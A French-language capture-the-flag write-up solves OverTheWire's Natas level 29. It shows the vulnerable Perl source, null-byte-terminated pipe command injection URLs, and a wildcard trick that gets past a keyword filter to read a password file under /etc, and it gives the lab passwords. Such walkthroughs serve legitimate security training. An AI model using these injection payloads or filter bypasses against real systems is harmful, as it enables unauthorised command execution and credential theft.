## Connexion (username=natas29 password=hwgoYUiGWoSZAqphtCAZf7u1jS16KEah)
```
http://natas29.natas.labs.overthewire.org/
```

## Recherche du mot de passe
En cherchant les injections perl j'ai appris que les pipes (|) permettent d'exécuter des codes dans les commandes fopen(my_file) en perl.

J'ai essayé quelques trucs pour modifier le paramèetre file, et j'ai identifié celle ci:
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
Output:
```
index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
```
Donc la commande doit se terminer par un caractère NULL.

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00

Le fichier est difficilement lisible mais donne un truc comme ça:
```perl
#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
END

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

On peut utiliser les wildcards de cat (* ou ?) qui va trouvé intelligemment le fichier sans écrire explicitement natas.


http://natas29.natas.labs.overthewire.org/?file=|cat%20../../../../etc/na?as_webpass/na?as30%00

## Prochain mot de passe
```
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```